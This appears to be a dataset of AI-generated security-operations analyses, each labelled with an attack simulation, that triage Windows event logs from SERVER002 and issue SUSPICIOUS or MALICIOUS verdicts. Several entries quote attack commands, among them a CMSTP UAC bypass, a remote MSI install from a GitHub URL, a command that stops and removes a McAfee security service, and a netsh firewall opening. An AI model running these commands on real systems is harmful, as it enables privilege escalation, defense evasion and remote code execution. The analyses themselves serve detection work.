  - The activities appear to be executing under a user account named `SERVER002\admin_test`, which suggests administrative privileges. Running such scripts under high privileges further raises security concerns.
- **CMD and Host Commands**:
  - There are instances of executing system utilities like `wevtutil.exe`, `conhost.exe`, and `wbem/WmiPrvSE.exe` that coincide with executing Windows management tasks. While these can be benign, in combination with suspicious PowerShell execution, they could imply an attempt to interact with system services or logs stealthily.
  
### Application Log Analysis
- **Edge Update**:
  - Multiple Edge Update service and process records note frequent sessions and updates. While this could typically indicate a legitimate background update process, in conjunction with other events, it requires validation.

## Assessment of the Situation
- **Overall Indicator**: The presence of administrative-level PowerShell activity executing `.ps1` scripts designed to leverage .NET InstallUtil capabilities indicates a possibly malicious activity. This becomes even more suspicious when compiled .NET assemblies are dynamically created and executed in a method usually associated with software installation.
  
## Identified Threats and Risks
- **Use of PowerShell and InstallUtil**: These are often used in sophisticated attacks to execute arbitrary code, allowing adversaries to potentially maintain persistence on the system or escalate privileges.
- **Privileged Execution**: The `admin_test` user execution context indicates sufficient privileges to alter system configurations or execute administrative tasks without significant hurdles.

## Guidance on how to proceed
1. **Further Investigation**: Initiate a detailed review of PowerShell script files and their contents to understand the scripts' source and intended actions.
2. **User Activity Review**: Confirm the legitimacy of the `SERVER002\admin_test` account activities. This involves verifying recent logins, the timing of script executions, and comparing against known user behaviors.
3. **Containment**: If unauthorized activity is confirmed, consider isolating the affected system to prevent lateral movement or further compromise.
4. **Audit System Logs**: Review system and application logs for systemic patterns or similar activities in other user profiles or systems within the network.
5. **Threat Intelligence**: Cross-reference hashes such as `SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3` against threat intelligence sources to identify known threats.

## Final Resolution
Based on the current log findings and the evident execution pattern, the activities described are indicative of potentially **MALICIOUS** behavior. Further incident response actions are recommended to investigate and handle this potential security incident."
Scarab Ransomware Defense Evasion Activities,"Based on the provided Windows event logs for Server002, here are the identified activities, along with their suspicious or malicious nature:

### Analysis of Logs

1. **Time Anomaly Events**:
   - **System Log** and **Security Log** exhibit log entries indicating a change in system time (`EventID: 4616`, `EventID: 1`). These indicate that the system time was manipulated, which is generally a red flag as it can be leveraged to cover tracks by aligning timestamps such to hide an activity happening at a specific time.

2. **Privilege Escalation**:
   - **Security Log - Event ID 4672**: Indicates that a logon session received special privileges (`admin_test`). The privileges listed (including `SeDebugPrivilege`) can be considered high-risk if not performed by a legitimate process since they can be used to obtain sensitive information or control processes.

3. **Unusual Command Execution**:
   - **Sysmon Log**: Shows the execution of `cmd.exe` with a suspicious command (`EventID: 1`) modifying registry related to `CredSSP` settings. This could indicate a method of weakening the security on the system by allowing encryption downgrade attacks (`/v AllowEncryptionOracle`).

4. **Process Execution and Parent-Child Relationships**:
   - Several instances of critical processes (`wevtutil.exe`, `whoami.exe`, `hostname.exe`) executed without clear legitimate context, pointing to potentially suspicious behavior aimed at reconnaissance or hiding actions.
   - There are multiple executions of processes related to Edge Update. Instances of `edgeupdate.exe` and related processes operating in a rapid sequence raise questions, especially if this machine is not actively managing updates at these timestamps.

### Assessment and Resolution

- **Time Setting Manipulation** (`EventID: 4616`): Unlawful change of system time can indicate an intention to hide traces of activities.
- **Registry Changes** (`EventID: 1`, Sysmon Logs): Modifications to system registry security parameters suspiciously.
- **Elevation of Privileges and Repeated Use of Advanced Privileges** (`EventID: 4672`): Indicates potential privilege escalation.

Given these indicators, the behavior in the logs presents a conformity to known patterns associated with intrusions, particularly the manipulation of system settings and privilege escalation.

### Conclusion: **MALICIOUS**

### Guidance and Recommendations

1. **Immediate Action**:
   - Freeze all operations of the `admin_test` account and conduct a full review of activities associated with this user.
   - Inspect the changes made to the system time context to verify what activities were contemporaneous.
   
2. **Audit and Forensics**:
   - Initiate a full audit to trace other potential unauthorized changes.
   - Consider forensic imaging of affected systems to preserve evidence.

3. **Remediation**:
   - Revert any unauthorized changes, such as restored system registry defaults.
   - Perform an assessment of server patch levels and possibly upgrade or change system configurations to prevent exploitation.

4. **Increasing System Monitoring**:
   - Enhance monitoring policies to observe and auto-alert similar activities post-incident.
   - Ensure regular updates of EDR systems and that they are fine-tuned to catch such anomalies earlier.

This proactive approach will help reinforce defenses while building an audit trail to address any potential weaknesses exploited by the attacker(s)."
Opening ports for proxy - HARDRAIN,"### Analysis of Logs:

#### Observations:

1. **Sysmon Logs**:
   - Frequent, almost simultaneous execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool for managing Windows event logs, but frequent invocation may suggest log tampering if not expected as part of regular operations.
   - Execution of `hostname.exe` and `whoami.exe` are standard utilities, but together, they may indicate someone is trying to gather system and user information, which can be the early steps of reconnaissance.
   - A `cmd.exe` process executes a command that uses `netsh.exe` to add a firewall rule, potentially allowing TCP traffic on port 450. This is unexpected and can be a sign of malicious intent to open backdoors or exfiltrate data.

2. **Security Logs**:
   - Time change logs via `svchost.exe`, which is often benign, but altering system time can be suspicious if used to evade logging or security mechanisms.

3. **System Logs**:
   - Time adjustments are seen, which are typically not directly linked to malicious activities but can be utilized during malicious operations to manipulate log timestamps.

4. **Application Logs**:
   - A process involving `RulesEngine` is present, though further context is required to assess its relevance.

#### Indicators of Malicious Activity:

- **Use of `.exe` Processes**: Frequent invocations of administrative tools (`wevtutil.exe`), utilities (`hostname.exe`, `whoami.exe`), and `cmd.exe` with `netsh` are suspicious, especially if all occur within a short time frame and without documented administrative need.
  
- **Firewall Rule Addition**: The specific command to add a firewall rule allowing incoming connections on a specific port (`450`) is especially concerning. This action could indicate preparation for external access or command and control activity.

- **Potential Reconnaissance**: Running `whoami.exe` and `hostname.exe` together might suggest an attempt to gather information about the system and user, often a precursor to further exploitation.

### Assessment of the Situation:

The logs indicate activities commonly associated with early phases of a cyber-attack, such as reconnaissance and system manipulation (e.g., firewall rule changes). The repeated use of `wevtutil.exe` without clear justification enhances the risk profile due to potential log manipulation efforts.

### Guidance on Resolution:

1. **Investigate Further**: The activities are **SUSPICIOUS** and warrant further investigation. Check:
   - User intent and justification for these activities.
   - Any other signs of compromise or data exfiltration.
   - Network activity related to port 450 on the specific host.

2. **Increase Monitoring**: Implement enhanced monitoring on the host and network, focusing on unusual processes or connections, especially related to the new firewall rule.

3. **Incident Response**: Engage the incident response team to further analyze the context of these events and consider reversing unauthorized configuration changes like the firewall rule.

4. **User and Process Verification**: Confirm that the user `SERVER002\admin_test` had legitimate reasons to perform these actions and verify the integrity of involved processes and binaries for signs of tampering.

### Final Resolution:

- **Resolution: SUSPICIOUS**: Further investigation is needed to ascertain the legitimacy and intent of these actions."
ProtocolHandler.exe Downloaded a Suspicious File,"Based on the provided log entries, here is a detailed analysis:

### Observations:

1. **Edge Update Events:**
   - There are numerous logs related to the process `MicrosoftEdgeUpdate.exe` and its various components. The process belongs to Microsoft's updater for the Edge browser and is expected to run as part of the regular update tasks. Most of the executions are executed by the `NT AUTHORITY\SYSTEM` user, which is standard for services that interact with system components.

2. **Command Line Execution:**
   - The suspicious command in `cmd.exe` at event 17991 appears to craft a variable using a registry query, then attempts to call `protocolhandler.exe` with a URL launching a `.docx` file. This kind of activity where a command is executed to retrieve and execute remote content can be indicative of malicious activity, possibly tied to phishing or exploitation attempts.

3. **PowerShell Execution:**
   - The Sysmon log shows the execution of `powershell.exe` by a user named `SERVER002\admin_test`. There isn't enough context on the command executed itself, but PowerShell being executed unexpectedly is suspicious and could be considered anomalous activity that should be verified against known admin actions.

4. **Registry and File Queries:**
   - Processes like `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` are commonly used in both legitimate administrative tasks and malicious activities like reconnaissance or privilege escalation. However, without specific command details, it's difficult to ascertain intent solely from these occurrences.

5. **Context and User Activities:**
   - Activities occurring around the same timestamp, especially with elevated command lines or unexpected process behavior, can indicate scheduling by malicious actors or scripts automating actions under the guise of legitimate software updates.
   - The context outlays a scenario where processes are being run quite close together in time, possibly triggering one another, or forming a process chain, which is largely used by sophisticated threat scenarios.

### Assessment:

The presence of `MicrosoftEdgeUpdate.exe` executing regularly and certain PowerShell activities could be benign if corresponding to a usual patch cycle or if run by an administrative user with good standing. However, the `cmd.exe` command attempting to manipulate remote objects and ambiguous nature of running numerous system utilities may warrant a deeper investigation to confirm their legitimacy.

Given the combination of these behaviors, the presence in the logs, and the potential for harm from executing downloaded files, these activities are classified as:

### Resolution: **SUSPICIOUS**

### Guidance:
- **Further Investigation Needed:**
  - Verify the legitimacy of the command run via `cmd.exe` and ensure the URL involved is not a malicious attempt to download or execute harmful content.
  - Investigate the `PowerShell` command executed, looking for its purpose and legitimacy, including source and context for its execution.
  - Review updates and execution logs to confirm they align with known patch cycles or update events.
  - Implement monitoring or alerts around similar command executions to detect quickly upon recurrence.
  - Validate system integrity and check for any indicators of compromise that might align with adware, malware, or unauthorized access affecting updates.
  
- **Immediate Steps:**
  - Consult with IT and security teams on further isolation or remediation steps if any unauthorized access or changes are confirmed through logs.
  - Communicate findings with relevant stakeholders, especially if significant risk exposure is identified."
Bypass UAC using sdclt DelegateExecute,"### Detailed Analysis of Logs

#### Security Logs
- **Event ID 4624**:
  - Successful login as SYSTEM (LogonType 5 - Service). This is generally benign as it signifies a service startup, which is expected behavior.
  
- **Event ID 4672**:
  - Assigning high privileges to SYSTEM account, which includes debugging, impersonate, and take ownership privileges. This is common for SYSTEM processes and isn't inherently suspicious.

- **Event ID 4616 (Twice)**:
  - Time change notifications by LOCAL SERVICE using svchost.exe. Time changes could be suspicious in certain contexts, but here they seem immediately sequential without any apparent motive of manipulation.

#### Application Logs
- Windows Defender is continuously reported as active and running (`SECURITY_PRODUCT_STATE_ON`), implying no immediate threat detected by the onboard AV.

#### PowerShell Logs
- **Event ID 600**: 
  - Shows suspicious PowerShell activity involving registry modification to execute `notepad.exe` via `cmd.exe`, and the use of `sdclt.exe` to potentially bypass UAC for elevated execution. These operations are highly indicative of potential malicious activity or compromise attempts using living-off-the-land binaries and techniques.

#### System Logs
- Kernel and time service logs show typical operations related to time zone and NTP synchronization. No immediately detectable anomalies.

#### Sysmon Logs
- **PowerShell Execution**: 
  - High integrity execution of a PowerShell script, which modifies registry keys to run applications at a system level without user consent. The script aims to use the ""Folder\shell\open\command"" registry path, which is a well-known technique for persistence and privilege escalation.
  
- **Process Creation**:
  - Series of executions by `wevtutil.exe` and `conhost.exe` observed with ""admin_test"" account. These processes backing PowerShell activity can be part of the same potential attack scenario.

### Assessment of the Situation
Based on the collective data presented in the logs, there is compelling evidence of potentially malicious activity involving:
- The use of PowerShell scripts to manipulate the registry for unauthorized command execution.
- Execution patterns aligned with privilege escalation or persistence tactics.

### Identified Threats or Risks
- Potential malicious deployment of scripting techniques typically seen in advanced threat actors focusing on privilege escalation or lateral movement.
- Possibility of further penetration using living-off-the-land binaries, specifically via `sdclt.exe` which may circumvent typical security controls.

### Guidance on How to Proceed
1. **Immediate Response**:
   - Disable or restrict the affected user account (`admin_test`) and monitor for further activity.
   - Isolate the system from the network if possible to conduct in-depth forensic analysis.
  
2. **Forensic Investigation**:
   - Capture current state of the machine’s memory and storage for forensic analysis.
   - Examine additional logs around the timestamp of PowerShell execution for evidence of how access was originally obtained.
  
3. **Threat Mitigation**:
   - Review and enhance PowerShell execution policies and logging.
   - Monitor for any similar tactics across other hosts as those used here may indicate a broader campaign.

### Conclusion
- **Resolution**: MALICIOUS

The activity captures definitive indicators of compromise, including unauthorized PowerShell usage indicative of a malicious attempt at privilege escalation or persistence strategy, necessitating immediate remediation steps and further investigation."
MSXSL Bypass using local files,"**Analysis of Windows Event Logs:**

**1. Security Log Analysis:**

- **Multiple 4624 Event:** This event indicates successful logons. Events have ""LogonType: 5,"" indicating a service startup, which is normal for system processes such as ""C:\Windows\System32\services.exe."" This does not directly indicate malicious activity.
- **4672 Event with Elevated Privileges:** These events show the assignment of special privileges to processes requiring high-level access, such as ""SeDebugPrivilege."" While normal for some system processes, it's important to monitor which processes receive these privileges.
- **5379 Event Series:** These events relate to credential validation for services. Most entries include a return code 3221226021, indicating a failed attempt to retrieve credentials from Windows Live or Microsoft Account, potentially suggesting failed authentication requests.
- **4798 Event Series:** Indicates queries for user information, potentially from a script or management task involving users like ""Administrator,"" ""admin_test,"" and others.

**2. Sysmon Log Analysis:**

- **Event ID 1 - Process Creation:** Frequent execution of ""C:\\Windows\\System32\\cmd.exe"" and other command-line utilities like Powershell and ""whoami.exe"" by the user ""SERVER002\\admin_test"" indicates possibly automated or scripted activity that needs further investigation.
- **Event ID 5 - Process Termination:** Processes such as ""wevtutil.exe"" and other utilities like ""PcaSvc.dll,PcaPatchSdbTask"" indicate potential attempts to clear event logs, which can be a tactic to hide malicious activities.
- **Unusual Command Execution:** Specific command-line executions like using ""msxsl.exe"" with XML and XSL files from temporary directories ('C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\') are suspicious as this can be used to execute malicious payloads using document transformation.
- **Microsoft Edge Update Processes:** Appear to show normal update activity, though it's crucial to confirm these shouldn’t be used as persistence mechanisms or exploitation vectors.

**3. PowerShell and Application Logs:**

- The PowerShell logs didn't indicate any logged events. Monitoring should continue as activity without logs might suggest log evasion.
- **Windows Defender State:** Continues to be on, indicating no broad disabling of security products, which is common in some attack vectors.

**Assessment and Recommendation:**

Based on the investigation of the logs, certain behaviors suggest potential suspicious activity, such as abuse of scripting tools for unauthorized purposes and potential log clearing. The use of specific utilities like ""msxsl.exe"" warrant further scrutiny. However, there is no direct evidence of definitive malicious actions recorded, such as clear signs of successful persistence mechanisms or privilege escalation exploits.

**Resolution: SUSPICIOUS**

- **Action Items:**
  - **Investigate the script/activity:** Review scripts or scheduled tasks running on the machine, particularly those associated with the mentioned tools and processes.
  - **Conduct User Access Review:** Inspect accounts like ""admin_test"" for unauthorized logins or unusual behavior.
  - **Log Monitoring:** Enhance logging and alerts around sensitive tools and potential log clearing activities.
  - **Threat Intelligence:** Cross-reference hash values and executable names against known threat indicators to clarify if any files have known associations with malware or threats.
  - **Network Analysis:** Review network connections for unusual data transmissions, particularly during times of noted activity in the logs."
CMSTP Executing UAC Bypass,"### Analysis of Logs

**Suspicious Behavior Identified:**

- **Command Execution via CMD with CMSTP**:
  - One event shows the execution of `cmd.exe` with the command line invoking `cmstp.exe` pointing to an `.inf` file located in a temporary directory. This behavior is often associated with proxy execution vulnerabilities where `cmstp.exe` can be used to execute malicious scripts or escalate privileges by registering malicious system components from a crafted `.inf` file.

  - The specific command line is:
    ```
    ""cmd.exe"" /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003_script.inf"" /au
    ```
  - This could potentially indicate an attempt to exploit a vulnerability for escalating privileges or executing unauthorized commands via `cmstp.exe`.

**Additional Context**:

- **Setups and Update Processes**:
  - The logs contain multiple legitimate-looking update processes related to Microsoft Edge, such as `MicrosoftEdgeUpdate.exe` and various setup executables. These processes appear to be performing updates and registrations that align with standard software maintenance activities.
  
- **User and System Logons**:
  - The `Security` logs show logon events using NTLM authentication and privilege assignments to `admin_test`, who has a high level of privileges. While the existence of such events alone is not inherently suspicious, they are noteworthy given the potential for abuse by malicious actors.
  
- **Network Connectivity**:
  - Logs do not explicitly indicate unauthorized network activity or connections, but network-level analysis could complement this investigation by providing details on external communication, particularly after credentials are used, as shown in NTLM logon processes.

### Assessment

The presence of a potentially harmful command involving `cmstp.exe`, coupled with the permissions associated with `admin_test`, suggests that there might be an attempt to execute unauthorized actions, possibly leveraging `cmstp.exe` for sensitive operations. This behavior should be investigated further to confirm whether it is part of legitimate administrative tasks or an indication of compromise.

### Conclusion

**Resolution: SUSPICIOUS**

Given the potential misuse of `cmstp.exe` and the privileged actions observed, further investigation is required to determine if these actions are part of legitimate administrative duties or indicative of malicious activities. This entails reviewing the context of `cmstp.exe` execution, verifying the integrity of `admin_test` account actions, and checking for the presence of unusual network activities originating from the machine under review.

### Guidance on How to Proceed

1. **Immediate Analysis**: Examine the specific environments where `cmstp.exe` was executed, including identifying the user action, purpose, and origin of the `.inf` file.
2. **Review Account Activity**: Ensure that `admin_test` is not compromised by correlating the activities to authorized tasks and verifying credentials.
3. **Network Monitoring**: Check for any external connections initiated by any involved processes around the timestamps of interest, ensuring no data exfiltration or unauthorized communication is occurring.
4. **System Integrity Checks**: Scan relevant systems for indicators of compromise, particularly focusing on potential lateral movement or malware deployment using the flagged process executions.
5. **Audit and Policy Review**: Implement more restrictive application and script execution policies to prevent misuse of system tools for unauthorized actions."
Remove Network Share PowerShell,"Upon reviewing the provided logs across various Windows event channels (System, Application, Sysmon, PowerShell, and Security logs), here is a detailed analysis:

1. **Time Generalization Events**: 
   - The System and Security logs indicate changes to the system time which are associated with legitimate svchost.exe processes. These events occurred within a few milliseconds and could potentially be attributed to normal system operations, possibly a time synchronization event.

2. **Application Events**:
   - The logs from the Application channel show that the `edgeupdate` service was stopped at two different points. This could either indicate a normal process behavior as part of an update cycle or a forced termination. As it is a Microsoft service running under SYSTEM authority, this doesn’t immediately indicate malicious activity.

3. **Sysmon Logs**:
   - The frequent usage of `wevtutil.exe`, `whoami.exe`, and `PowerShell.exe` (`Remove-SmbShare` command) is noteworthy. `wevtutil.exe` is used for event log management, which can sometimes be used for malicious purposes to cover tracks. The `whoami.exe` process shows a query for user identity information, and the use of PowerShell to remove SMB shares (`Remove-SmbShare`) could potentially be considered suspicious, especially without context.
   - Numerous invocations of Edge Update-related executables are logged, which appear to be an update process, as indicated by the version numbers and command-line arguments. These activities might fall within the scope of usual update operations unless further alert-specific context suggests otherwise.

4. **PowerShell Events**:
   - Several PowerShell instances were executed using `Remove-SmbShare`. The lack of further command details and whether these actions align with the intended use policy can flag these commands as requiring scrutiny, especially in a non-administrative or unexpected context.

5. **Security Events**:
   - Aligned with the System log, Security log event 4616 indicates time change, which is generally benign unless manipulated in an unauthorized manner to tamper logs. Based on the context provided, these appear aligned with legitimate services.

**Assessment**:
- There are no explicit indicators of malicious payloads or exploits present in the logs. However, the use of administrative utilities (`wevtutil.exe`, `PowerShell.exe` with admin-level commands) by `admin_test` could suggest potential misuse or over-reliance that should be investigated further. Also, reviewing the context of the `edgeupdate` service termination is warranted if this was against standard operating procedures for that host.

**Resolution**:
- **SUSPICIOUS**: The behavior doesn't definitively contain signs of compromise but shows enough unusual processes and operations, specifically around the use of administrative and PowerShell commands, that warrants further investigation to rule out any misuse. It would be prudent to gather more context around these operations, examine the intention or necessity behind these commands, and check for any policy violations to adjudicate the activities observed."
Stop and Remove Arbitrary Security Windows Service,"### Detailed Analysis of the Logs:

**Suspicious/Anomalous Behavior:**

1. **PowerShell Activity:**
   - A PowerShell command to stop and remove the McAfee DLP Agent Service was executed: `Stop-Service -Name McAfeeDLPAgentService, Remove-Service -Name McAfeeDLPAgentService`. This action is highly suspicious, as it directly disables and removes a security control, which could be attempted by an attacker to evade detection.

2. **Process Execution:**
   - Multiple executions of the `wevtutil.exe` tool by user ""admin_test"" as seen in Sysmon logs. Wevtutil is a legitimate Windows utility for managing event logs, but its repeated use in short intervals might indicate log manipulation.
   - The repeated execution of 'conhost.exe' and 'wevtutil.exe' in close succession can be suspicious if not part of routine administrative tasks, especially the part with `admin_test` user privileges.

3. **Use of High-Privilege Processes:**
   - Processes with elevated privileges were observed such as `taskhostw.exe`, `MusNotification.exe`, and `svchost.exe` running under the SYSTEM account, which is expected for system processes but should be monitored for irregular tuning.

4. **Time Change Events:**
   - Minor time adjustments were recorded, which might indicate attempts to tamper with system time logs, although such changes are often benign.

**Potential Malicious Activity:**

- The distinct and targeted PowerShell command to disable security services like the McAfee DLP Agent Service strongly indicates an intent to disable security mechanisms, suggesting a potential compromise.
- High-privilege levels utilized for `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` process suggest elevated accesses, which could be leveraged for illicit actions.

### Assessment of the Situation:

- The logs reveal potentially **malicious activity**, specifically evidenced by the execution of a PowerShell script that aims to stop and remove a critical security service, indicating a possible compromise or malicious action against the host. This demonstrates a likely attempt to evade security measures, which is a common trait in malicious activities.

### Threats or Risks Identified:

- Disabling of security services:
  - Loss of protective monitoring by the McAfee DLP Agent Service exposes the system to sensitive data disclosure.
- Potential further exploitation if initial compromise succeeded:
  - Unchecked system manipulation can lead to data breaches or additional malware deployment.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Quarantine the affected system to prevent potential lateral movement.
   - Conduct a full malware scan and integrity check of the system to identify other possible compromises or malicious persistence mechanisms.
   - Investigate the ""admin_test"" account activities to understand if this is a compromised account or misuse by an insider.

2. **Forensic Analysis:**
   - Review the purposes and contexts in which `wevtutil.exe` was used, and assess whether any event logs were deleted or modified.
   - Conduct a detailed network traffic analysis around the reported time to identify potentially suspicious communications.

3. **Recommendation and Follow-up:**
   - Reinforce endpoint protection settings to prevent unauthorized privilege use and enhance detection capabilities around script execution and service manipulation.
   - Implement strict access controls and audit logs to track and alert on any attempts to stop or remove critical security services.

### Resolution:
- **MALICIOUS** - The logs contain activity that is clearly indicative of malicious intent, specifically the disabling of essential security services through unconventional command usage, supporting a conclusion of potentially malicious activity. Further investigation and immediate containment are warranted."
Activate Windows NoSetTaskbar Group Policy Feature,"Based on the provided logs, here is a detailed analysis of the potential indicators of compromise and suspicious activities:

### Security Logs:
- **EventID 4616**: These events indicate time change events initiated by the `svchost.exe` process running under `LOCAL SERVICE` on `NT AUTHORITY`. While time change events can sometimes indicate nefarious activities like log tampering, these events appear to align closely and do not indicate an anomaly when taken together in their context. 

### Application Logs:
- **Microsoft-Windows-Security-SPP (EventID 16384)**: This entry is typical for the Software Protection Platform Service and appears to follow standard operations.
- **EdgeUpdate Events**: Execution logs of EdgeUpdate with ""Service stopped"" messages do not inherently indicate malicious behavior, particularly if aligned with legitimate update processes.

### Sysmon Logs:
- **Process Execution (EventID 1)**: 
  - Multiple executions of `wevtutil.exe` and `conhost.exe` by `admin_test` seem to follow legitimate system commands often used for event log operations and console purposes. However, the frequent spawning might be suspicious if not typical of the administrator's behavior.
  - **Process Execution of `cmd.exe` and `reg.exe`**: A suspicious command was executed via `cmd.exe` to add a registry entry `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` with the value `NoSetTaskbar`. This registry modification can alter user interface functionalities and might be intended to obscure system operations or prevent taskbar modifications, which could be considered suspicious and potentially malicious.
  - **Execution of `whoami.exe` and `HOSTNAME.EXE`**: These are diagnostic commands and not inherently suspicious unless tied to unauthorized privilege escalation attempts.
- **Microsoft Edge Update Events**: Repeated service installations and updates for Microsoft Edge Update (standard product maintenance) but elaborate command lines, coupled with entries in `C:\Program Files (x86)\Microsoft\Temp\`, could indicate either legitimate updates or potential misuse, requiring context verification.

### System Logs:
- The system logs show routine operations related to time synchronization and service processing without indications of compromise.

### Assessment
- The standout activity is the registry modification entry through `cmd.exe`, indicating an attempt to change system behavior which is not typical for non-administrative activities without clear purpose. This could potentially indicate an attempt for persistence or mitigation against detection/response measures.
- There are no direct signs of privilege escalation apart from the high integrity level in some Sysmon logs, which might be typical under elevated privileges for the `admin_test` user.
- The activities surrounding `MicrosoftEdgeUpdate.exe` appear consistent with software updates, but any unexpected or misconfigured update services should be scrutinized for integrity.

**Resolution:** **SUSPICIOUS**

Though there's no direct confirmation of a breach, the registry changes through command-line operations, combined with several rapid process creations, warrant a deeper investigation to rule out potential lateral movement or persistence mechanism installation. Review must be conducted on user activity alignment, typical operational patterns, and potentially gather insight from the CEO for intent clarity. Additionally, check external connections and scrutinize legitimate updates versus potential tampering indicators."
Indicator Manipulation using FSUtil,"Upon reviewing the provided Windows event logs, several key observations emerge regarding potentially suspicious behavior:

### Key Indicators of Suspicious Activity:
1. **Privilege Escalation:**
   - Event ID 4672 indicates special privileges were assigned to the user `admin_test`. These privileges include `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeTakeOwnershipPrivilege`, among others. Such privileges are powerful and could potentially be exploited for malicious purposes.

2. **High Integrity Execution:**
   - Multiple processes are being executed under a high integrity level by the user `admin_test`. This includes PowerShell commands and usage of `fsutil.exe`, which might indicate an attempt to manipulate file system data.

3. **Notable PowerShell Activity:**
   - A PowerShell command is executed to create and modify a file located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\data.txt`). The use of `fsutil` within this command can imply attempts to alter file content or potentially to hide malicious activity.
   - The specific use of `setZeroData` could attempt to manipulate or obscure the file content, possibly suggesting data hiding or manipulation tactics.

4. **Execution of Common Tools:**
   - The usage of PowerShell, `whoami.exe`, and `hostname.exe` executed by the `admin_test` user, particularly when aligned with privilege escalation activities and non-standard command execution paths, suggests potential reconnaissance or system enumeration activities.

5. **EdgeUpdate Using Command-line Arguments:**
   - Observations of Microsoft Edge Update processes with a verbose command-line argument set. Although this could be system updates, irregularities in EdgeUpdate execution flows may be worthy of further examination.

### Assessment and Risks:
- **Privilege Escalation:** The granting of extensive privileges to a user account (`admin_test`) is concerning and represents a significant risk if these privileges have been obtained maliciously.
- **System Commands in Use:** The execution of commands such as `fsutil` and suspicious PowerShell scripts could be indicative of data tampering or preparation for further malicious activities.
- **Persistence or Unauthorized Access:** The activity, in conjunction with elevated privileges, might suggest attempts to maintain persistence or explore sensitive system areas.

### Recommended Actions:
- **Further Investigation of User Activities:** Verify if the `admin_test` account's behavior matches expectations and whether the account itself could be compromised.
- **Review Privilege Assignment:** Examine the necessity and legitimacy of privileges assigned to `admin_test`. These should be revoked if unjustified.
- **Analyze PowerShell Scripts:** Scrutinize the PowerShell scripts utilized for any evidence of malicious intent or unauthorized file operations.
- **Security Posture Review:** Engage in heightened monitoring for suspected systems, particularly for any unusual external communications or file manipulations.

### Resolution:
Based on the analysis, this activity is categorized as **SUSPICIOUS** due to the potential for malicious activity and the necessity for further investigation to rule out misuse of elevated privileges and unauthorized system changes."
Msiexec.exe - Execute Remote MSI file,"### Detailed Analysis

Upon examining the provided Sysmon, PowerShell, and Application logs from the Windows event log collection, it is evident that there are several potentially suspicious activities that raise concerns about the host's security status.

#### Suspicious Activities

1. **PowerShell Activity:**
   - A PowerShell script was executed with the `-nop` (No Profile) parameter and a command that outputs ""JScript executed me!"". This indicates potential malicious script execution, likely from a downloaded file.
   - PowerShell commands executed without profiles and showing specific messages can be a sign of script-based attacks.

2. **Installation of MSI File:**
   - A `cmd.exe` process was initiated, which executed `msiexec.exe` to install an MSI file from `https://github.com/file/file-file/raw/master/files/data.007/bin/data.007_JScript.msi`.
   - The network installation of an MSI file from a GitHub repository is suspicious, especially when executed without any user interaction.

3. **Process Chain:**
   - The process chain leading to the PowerShell execution and MSI installation includes legitimate system utilities. However, these utilities (`wevtutil.exe`, `conhost.exe`) being used in rapid succession to install external content is atypical for normal operations and suggests the possibility of a Living-Off-the-Land Binaries (LOLBin) attack.
   - The parent-child relationships of processes, such as `cmd.exe` spawned by `wsmprovhost.exe`, contribute to suspect activity.

#### Indicators of Malicious Activity

- The use of PowerShell with non-standard flags, execution of scripts from untrusted locations, and the associated system files used are often seen in attack vectors involving file-less malware and initial stages of a breach.
- The presence of high-integrity level processes performing these actions under an administrative context (`SERVER002\\admin_test`) could suggest privilege misuse or compromise of an administrative account.

#### Overall Assessment

Given the combination of PowerShell execution with `-nop`, installation from an external and potentially untrusted source, and the rapid process creation associated with sensitive system utilities, there are multiple indicators of compromise.

### Threats or Risks Identified

- Potential installation of malicious software via MSI from an external source.
- Unauthorized PowerShell usage with potentially harmful scripts.
- High-integrity level execution suggests a breached admin context, raising concerns about further system compromise or lateral movement possibilities.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Quarantine the affected system (Server002) from the network to prevent further spread or data exfiltration.
   - Conduct a full forensic analysis on the machine to identify and remove any malicious software or scripts.
   - Change all administrative passwords and review privileged accounts for abnormal activity.

2. **Further Investigation:**
   - Analyze the MSI file downloaded from the external repository to determine its purpose and content.
   - Review network logs to identify other potentially compromised systems or communications with malicious IP addresses.

3. **Prevention:**
   - Implement strict PowerShell execution policies and monitor for anomalous use patterns.
   - Update endpoint protection to better detect and respond to script-based attacks and MSI file downloads from non-corporate sources.

### Resolution
**Resolution: MALICIOUS** - The logs indicate a high likelihood of malicious activity with unauthorized script execution and suspicious network-based software installation. Immediate containment and investigation are warranted."
Hidden Window,"Based on the provided event logs, I'll focus on analyzing each log source in the context of potential indicators of malicious activity:

### Security Log
- **Event ID 4616**: These events indicate time change, which is generally benign if done by system processes. Both events are generated by `svchost.exe` and involve the Local Service account. No direct suspicion arises from these events unless they correlate with other suspicious activities.

### Windows PowerShell Log
- **Activity**: There are multiple events where PowerShell is executed with a command to start another PowerShell process in a hidden window and launch `calc.exe`. This is an unusual command pattern often associated with attempts to mask malicious activities or test execution, typically seen in post-exploitation scenarios.

### Sysmon Log
- **Process Execution**: Several instances of `wevtutil.exe`, `conhost.exe`, and regular executions like `hostname.exe`, `whoami.exe`, etc., by the user `admin_test` are noted. These executables are system utilities and can be used manually or by scripts, but when grouped with the PowerShell activity, it raises suspicion about why they are being called frequently.
- **PowerShell Execution**: The command-line pattern ""`powershell.exe & {Start-Process powershell.exe -WindowStyle hidden calc.exe}`"" is seen. This matches with the PowerShell log and indicates the execution of processes in a potentially stealthy manner.
- **Final Entry for `calc.exe`**: Its execution with high integrity level spawned through PowerShell, shows the context provided by PowerShell Logs is accurate.

### System and Application Logs
- **General Activity**: These logs predominantly reflect routine system operations like time adjustments and general system tasks (e.g., `TrustedInstaller.exe`, `sppsvc.exe`). They do not inherently indicate irregular activities.

### Assessment & Conclusion

**Suspicious Behavior**:
- The consistent pattern of invoking PowerShell to execute other processes in a hidden window is highly suspicious. This is indicative of an attempt to conceal activity from the user or from standard monitoring.
